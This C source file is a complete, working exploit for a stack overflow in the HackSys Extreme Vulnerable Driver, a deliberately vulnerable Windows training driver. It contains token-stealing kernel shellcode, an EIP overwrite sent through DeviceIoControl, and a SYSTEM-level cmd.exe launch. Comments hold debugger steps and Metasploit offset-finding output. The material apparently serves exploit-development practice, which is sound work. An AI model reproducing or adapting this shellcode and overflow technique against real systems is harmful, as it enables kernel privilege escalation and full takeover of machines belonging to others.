#include "stdafx.h"
#include "windows.h"
// These aren't used but heck I'll just add them so the shellcode later makes more sense.
#define KTHREAD_OFFSET     0x124  // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET    0x050  // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET         0x0B4  // nt!_EPROCESS.UniqueProcessId
#define FLINK_OFFSET       0x0B8  // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET       0x0F8  // nt!_EPROCESS.Token
#define SYSTEM_PID 0x004 // SYSTEM Process PID
int main()
{
	printf("Starting the exploit!\r\n");
	printf("Calling CreateFile to get handle to file.\r\n");

	/*
	Can determine the device name from the DriverEntry procedure which calls IoCreateDevice. In here we can see the string variable
	aDeviceHacksyse which is set to "\Device\HackSysExtremeVulnerableDriver"
	*/
	HANDLE driverHandle = CreateFileA("\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL, NULL);

	if (driverHandle == INVALID_HANDLE_VALUE) {
		printf("Unable to get a handle to the HEVD driver :(\r\n");
		return 1;
	}
	else {
		printf("Got handle to driver!\r\n");
		printf("Handle: %i\r\n", driverHandle);

		printf("Allocating shellcode....\r\n");
		char shellcode[70] = (
			"\x60" // PUSHAD
			"\x64\xA1\x24\x01\x00\x00" // MOV EAX, fs:[KTHREAD_OFFSET]
			"\x8B\x40\x50" // MOV EAX, [EAX + EPROCESS_OFFSET]
			"\x89\xC1" // mov ecx, eax (Current EPROCESS structure)
			"\x8B\x98\xF8\x00\x00\x00" // mov ebx, [eax + TOKEN_OFFSET]
			// #---[Copy System PID token]
			"\xBA\x04\x00\x00\x00" // mov edx, 4 (SYSTEM PID)
			"\x8B\x80\xB8\x00\x00\x00" // mov eax, [eax + FLINK_OFFSET] <-|
			"\x2D\xB8\x00\x00\x00" //               sub eax, FLINK_OFFSET |
			"\x39\x90\xB4\x00\x00\x00" //      cmp[eax + PID_OFFSET], edx |
			"\x75\xED" // jnz                                          -> |
			"\x8B\x90\xF8\x00\x00\x00" // mov edx, [eax + TOKEN_OFFSET]
			"\x89\x91\xF8\x00\x00\x00" // mov[ecx + TOKEN_OFFSET], edx
			//#---[Recover]
			"\x61" // popad
			"\x31\xC0" // Set NTSTATUS->STATUS_SUCCESS so calling function thinks we exited successfully
			/*
			After call to triggeroverflow the code is expecting the function it returns to to execute
				POP EBP
				RET 8
			so we emulate these instructions at the end of our shellcode so the program thinks our shellcode is
			the function it is expecting to return to and the stack is all good :)

			To check this, one can use the following steps:
			1. Load up your VM with WinDBG attached in kernel debug mode.
			2. Load up the driver with OSRLOADER.
			2. In WinDBG, pause execution of the VM with the "Debug -> Break" menu option.
			3. Type "lm" to list all loaded modules and then scroll down to the one named HEVD. Take note of the base address this is loaded at.
			In the following example the base address were the driver code starts would be 97FC0000 and we can see that the last segment
			of driver code starts at 97FC8000:
			97fc0000 97fc8000   HEVD       (deferred)
			4. Load the driver into IDA and then use "Edit -> Segments -> Rebase Program" and in the value section enter the base address you took note 
			of earlier (in this case 0x97FC0000)
			5. Click OK and scroll to the function or address you want to debug.
			6. Take note of the address IDA says the instruction is at.
			7. Open WinDBG, pause the kernel execution, and enter "bp *address noted earlier*.
			8. Tada, WinDBG should now pause execution when the address is hit.
			*/
			"\x5D" // pop ebp
			"\xC2\x08\x00" // ret 8
		);
		printf("Shellcode size: %i\r\n", sizeof(shellcode));
		LPVOID shellcodeAddress = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		memcpy(shellcodeAddress, shellcode, sizeof(shellcode));
		char buffer[0x824];
		memset(buffer, '\x41', sizeof(buffer));
		/*
		root@kali:~*censored*# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2128
		Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8C
		root@kali:~*censored*# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb 
		[x] missing argument: No options set, try -h for usage
		root@kali:~*censored*# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -h
		Usage: /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb [options]
		Example: /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q Aa3A
		[*] Exact match at offset 9

		Options:
			-q, --query Aa0A                 Query to Locate
			-l, --length <length>            The length of the pattern
			-s, --sets <ABC,def,123>         Custom Pattern Sets
			-h, --help                       Show this message
		root@kali:~*censored*# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 72433372 -l 2128 
		[*] Exact match at offset 2080
		root@kali:~*censored*# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 43327243 -l 2128 
		[*] Exact match at offset 2076
		root@kali:~*censored*# 

		*/
		// Thanks to https://stackoverflow.com/questions/1163624/memcpy-with-startindex for this
		// Overwrite EIP
		memcpy(&buffer[0x820], &shellcodeAddress, 4);
		// Overwrite EBP
		memcpy(&buffer[0x81C], "\x44\x44\x44\x44", 4);
		printf("\r\nSending buffer!\r\n");
		printf("Buffer length: %i\r\n", sizeof(buffer));
		printf("IOCTL: 0x222003\r\n");

		DWORD  bytesReturned = 0;
		// Thanks to https://msdn.microsoft.com/en-us/library/windows/desktop/aa363147(v=vs.85).aspx for how to call this correctly for last 2 args.
		if ((DeviceIoControl(driverHandle, 0x222003, &buffer, sizeof(buffer), NULL, 0, &bytesReturned, (LPOVERLAPPED)NULL) == 0)) {
			printf("DeviceIoControl call failed...\r\n");
		}
		else {
			printf("DeviceIoControl call succeeded!\r\n");
			STARTUPINFOA si;
			PROCESS_INFORMATION pi;

			ZeroMemory(&si, sizeof(si));
			si.cb = sizeof(si);
			ZeroMemory(&pi, sizeof(pi));
			CreateProcessA("C:\\Windows\\system32\\cmd.exe", NULL, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
		}
	}
	return 0;
}